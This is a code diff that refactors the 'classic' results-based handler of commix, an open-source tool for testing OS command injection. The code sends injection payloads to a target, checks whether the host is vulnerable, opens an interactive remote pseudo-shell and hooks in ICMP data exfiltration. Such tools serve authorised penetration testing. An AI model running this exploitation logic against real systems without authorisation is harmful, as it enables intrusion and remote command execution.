@@ -2,13 +2,13 @@
 # encoding: UTF-8
 
 """
- This file is part of commix tool.
+ This file is part of commix (@commixproject) tool.
  Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
  https://github.com/stasinopoulos/commix
 
  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
- the Free Software Foundation, either version 3 of the License, or
+ the Free Software Foundation,either version 3 of the License,or
  (at your option) any later version.
  
  For more see the file 'readme/COPYING' for copying permission.
@@ -31,17 +31,22 @@ from src.utils import settings
 from src.core.requests import headers
 from src.core.requests import parameters
 
-from src.core.injections.results_based.techniques.payloads import classic_payloads
+from src.core.injections.results_based.techniques.classic import cb_injector
+from src.core.injections.results_based.techniques.classic import cb_payloads
+from src.core.injections.results_based.techniques.classic import cb_enumeration
 
 """
   The "classic" technique on Result-based OS Command Injection.
 """
 
+#-------------------------------------------------------
+# The "icmp exfiltration" injection technique handler.
+#-------------------------------------------------------
 def icmp_exfiltration_handler(url,http_request_method):
   
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
-    print colors.RED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
+    print colors.BGRED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
     sys.exit(0)
     
   if http_request_method == "GET":
@@ -66,12 +71,11 @@ def icmp_exfiltration_handler(url,http_request_method):
   ip_data = menu.options.ip_icmp_data
   
   # Load the module ICMP_Exfiltration
-  
   try:
     from src.core.modules import ICMP_Exfiltration
     
   except ImportError as e:
-    print colors.RED + "(x) Error:", e
+    print colors.BGRED + "(x) Error:",e
     print colors.RESET
     sys.exit(1)
     
@@ -79,16 +83,20 @@ def icmp_exfiltration_handler(url,http_request_method):
   sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... \n" + colors.RESET)
   sys.stdout.flush()
   
-  ip_src =  re.findall(r"ip_src=(.*),", ip_data)
+  ip_src =  re.findall(r"ip_src=(.*),",ip_data)
   ip_src = ''.join(ip_src)
   
-  ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
+  ip_dst =  re.findall(r"ip_dst=(.*)",ip_data)
   ip_dst = ''.join(ip_dst)
   
   ICMP_Exfiltration.exploitation(ip_dst,ip_src,url,http_request_method,request_data)
 
 
-def classic_exploitation_handler(url,delay,filename,http_request_method):
+
+#---------------------------------------------
+# The "classic" injection technique handler.
+#---------------------------------------------
+def cb_injection_handler(url,delay,filename,http_request_method):
   
   counter = 0
   vp_flag = True
@@ -101,7 +109,7 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
   sys.stdout.flush()
   
   # Print the findings to log file.
-  output_file = open(filename + ".txt", "a")
+  output_file = open(filename + ".txt","a")
   output_file.write("\n---")
   output_file.write("\n(+) Type : " + injection_type)
   output_file.write("\n(+) Technique : " + technique.title())
@@ -129,15 +137,13 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	    B64_DEC_TRICK = ""
 	    
 	  try:
-	    
 	    # Classic decision payload (check if host is vulnerable).
-	    payload = classic_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
-			    
+	    payload = cb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
+	    
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
 	      prefix = menu.options.prefix
 	      payload = prefix + payload
-	      
 	    else:
 	      payload = prefix + payload
 	      
@@ -145,110 +151,50 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	    if menu.options.suffix:
 	      suffix = menu.options.suffix
 	      payload = payload + suffix
-	      
 	    else:
 	      payload = payload + suffix
 
 	    if separator == " " :
-	      payload = re.sub(" ", "%20", payload)
+	      payload = re.sub(" ","%20",payload)
 	    else:
-	      payload = re.sub(" ", whitespace, payload)
+	      payload = re.sub(" ",whitespace,payload)
 
-	    #Check if defined "--verbose" option.
+	    # Check if defined "--verbose" option.
 	    if menu.options.verbose:
 	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
-	    
-	    # Check if defined method is GET (Default).
-	    if http_request_method == "GET":
 	      
-	      # Check if its not specified the 'INJECT_HERE' tag
-	      url = parameters.do_GET_check(url)
-	      
-	      # Define the vulnerable parameter
-	      vuln_parameter = parameters.vuln_GET_param(url)
+	    # Check if target host is vulnerable.
+	    response,vuln_parameter = cb_injector.injection_test(payload,http_request_method,url)
 
-	      target = re.sub(settings.INJECT_TAG, payload, url)
-	      request = urllib2.Request(target)
-
-	      # Check if defined extra headers.
-	      headers.do_check(request)
-
-	      # Check if defined any HTTP Proxy.
-	      if menu.options.proxy:
-		try:
-		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		  opener = urllib2.build_opener(proxy)
-		  urllib2.install_opener(opener)
-		  response = urllib2.urlopen(request)
-		  
-		except urllib2.HTTPError, err:
-		  print "\n(x) Error : " + str(err)
-		  sys.exit(1) 
-	  
-	      else:
-		response = urllib2.urlopen(request)
-		
-	    # Check if defined method is POST.
-	    else:
-	      parameter = menu.options.data
-	      parameter = urllib2.unquote(parameter)
-	      
-	      # Check if its not specified the 'INJECT_HERE' tag
-	      parameter = parameters.do_POST_check(parameter)
-	      
-	      # Define the POST data
-	      data = re.sub(settings.INJECT_TAG, payload, parameter)
-	      request = urllib2.Request(url, data)
-	      
-	      # Check if defined extra headers.
-	      headers.do_check(request)
-	      
-	      # Define the vulnerable parameter
-	      vuln_parameter = parameters.vuln_POST_param(parameter,url)
-	      
-	      # Check if defined any HTTP Proxy.
-	      if menu.options.proxy:
-		try:
-		  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-		  opener = urllib2.build_opener(proxy)
-		  urllib2.install_opener(opener)
-		  response = urllib2.urlopen(request)
-				
-		except urllib2.HTTPError, err:
-		  print "\n(x) Error : " + str(err)
-		  sys.exit(1) 
-	  
-	      else:
-		response = urllib2.urlopen(request)
-		  
 	    # if need page reload
-	    if menu.options.url_reload: 
+	    if menu.options.url_reload:
 	      time.sleep(delay)
 	      response = urllib.urlopen(url)
 	      
-	    html_data = response.read()
-	    shell = re.findall(r""+TAG+TAG+TAG+"", html_data)
+	    # Evaluate test results.
+	    shell = cb_injector.injection_test_results(response,TAG)
 	    
 	  except:
 	    continue
 	  
+	  # Yaw, got shellz! 
+	  # Do some magic tricks!
 	  if shell:
-	    	    
 	    found = True
 	    no_result = False
+	    
 	    if http_request_method == "GET":
-	      	      
 	      # Print the findings to log file
 	      if vp_flag == True:
-		output_file = open(filename + ".txt", "a")
+		output_file = open(filename + ".txt","a")
 		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
 		output_file.write("\n---\n")
 		vp_flag = False
 		output_file.close()
 		
 	      counter = counter + 1
-	      output_file = open(filename + ".txt", "a")
-	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	      output_file = open(filename + ".txt","a")
+	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
 	      output_file.close()
 	      
 	      # Print the findings to terminal.
@@ -256,21 +202,20 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
 	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
 	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
-	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
+	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET
 
 	    else :
-	      
 	      # Print the findings to log file
 	      if vp_flag == True:
-		output_file = open(filename + ".txt", "a")
+		output_file = open(filename + ".txt","a")
 		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
 		output_file.write("\n---\n")
 		vp_flag = False
 		output_file.close()
 		
 	      counter = counter + 1
-	      output_file = open(filename + ".txt", "a")
-	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
+	      output_file = open(filename + ".txt","a")
+	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
 	      output_file.close()
 	      
 	      # Print the findings to terminal.
@@ -278,114 +223,33 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
 	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
 	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
 	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
-	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET + "\n"
-	      	      
-	    gotshell = raw_input("(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
+	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET
+	      
+	    # Check for any enumeration options.
+	    cb_enumeration.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
 	    
+	    # Pseudo-Terminal shell
+	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ")
 	    if gotshell == "Y" or gotshell == "y":
 	      print ""
 	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
-	      
 	      while True:
 		try:
 		  cmd = raw_input("Shell > ")
-		  
 		  if cmd == "q":
 		    sys.exit(0)
 		    
 		  else:
-		    # Execute shell commands on vulnerable host.
-		    payload = classic_payloads.cmd_execution(separator,TAG,cmd)
+		    # The main command injection exploitation.
+		    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
 		    
-		    if separator == " " :
-		      payload = re.sub(" ", "%20", payload)
-		    else:
-		      payload = re.sub(" ", whitespace, payload)
-
-		    # Check if defined "--prefix" option.
-		    if menu.options.prefix:
-		      prefix = menu.options.prefix
-		      payload = prefix + payload
-		    else:
-		      payload = prefix + payload
-		      
-		    # Check if defined "--suffix" option.
-		    if menu.options.suffix:
-		      suffix = menu.options.suffix
-		      payload = payload + suffix
-		    else:
-		      payload = payload + suffix
-			
-		    # Check if defined "--verbose" option.
-		    if menu.options.verbose:
-		      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
-		      
-		    # Check if defined method is GET (Default).
-		    if http_request_method == "GET":
-		      
-		      # Check if its not specified the 'INJECT_HERE' tag
-		      url = parameters.do_GET_check(url)
-		      
-		      target = re.sub(settings.INJECT_TAG, payload, url)
-		      vuln_parameter = ''.join(vuln_parameter)
-		      request = urllib2.Request(target)
-		      
-		      # Check if defined extra headers.
-		      headers.do_check(request)	
-			
-		      # Check if defined any HTTP Proxy.
-		      if menu.options.proxy:
-			try:
-			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-			  opener = urllib2.build_opener(proxy)
-			  urllib2.install_opener(opener)
-			  response = urllib2.urlopen(request)
-					  
-			except urllib2.HTTPError, err:
-			  print "\n(x) Error : " + str(err)
-			  sys.exit(1) 
-		  
-		      else:
-			response = urllib2.urlopen(request)
-			
-		    else :
-		      
-		      # Check if defined method is POST.
-		      parameter = menu.options.data
-		      parameter = urllib2.unquote(parameter)
-		      
-		      # Check if its not specified the 'INJECT_HERE' tag
-		      parameter = parameters.do_POST_check(parameter)
-		      
-		      data = re.sub(settings.INJECT_TAG, payload, parameter)
-		      request = urllib2.Request(url, data)
-		      
-		      # Check if defined extra headers.
-		      headers.do_check(request)
-			
-		      # Check if defined any HTTP Proxy.
-		      if menu.options.proxy:
-			try:
-			  proxy= urllib2.ProxyHandler({'http': menu.options.proxy})
-			  opener = urllib2.build_opener(proxy)
-			  urllib2.install_opener(opener)
-			  response = urllib2.urlopen(request)
-					  
-			except urllib2.HTTPError, err:
-			  print "\n(x) Error : " + str(err)
-			  sys.exit(1) 
-		  
-		      else:
-			response = urllib2.urlopen(request)
-			
 		    # if need page reload
 		    if menu.options.url_reload:
 		      time.sleep(delay)
 		      response = urllib.urlopen(url)
-
-		    html_data = response.read()
-		    shell = re.findall(r""+TAG+TAG+"(.*)"+TAG+TAG+"", html_data)
-		    
+		      
+		    # Command execution results.
+		    shell = cb_injector.injection_results(response,TAG)
 		    if shell:
 		      shell = "".join(str(p) for p in shell)
 		      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
@@ -411,6 +275,7 @@ def classic_exploitation_handler(url,delay,filename,http_request_method):
     print ""
     
     
+    
 def exploitation(url,delay,filename,http_request_method):
   
   # Use the ICMP Exfiltration technique
@@ -418,5 +283,5 @@ def exploitation(url,delay,filename,http_request_method):
     icmp_exfiltration_handler(url,http_request_method)
     
   else:
-    classic_exploitation_handler(url,delay,filename,http_request_method)
+    cb_injection_handler(url,delay,filename,http_request_method)
 
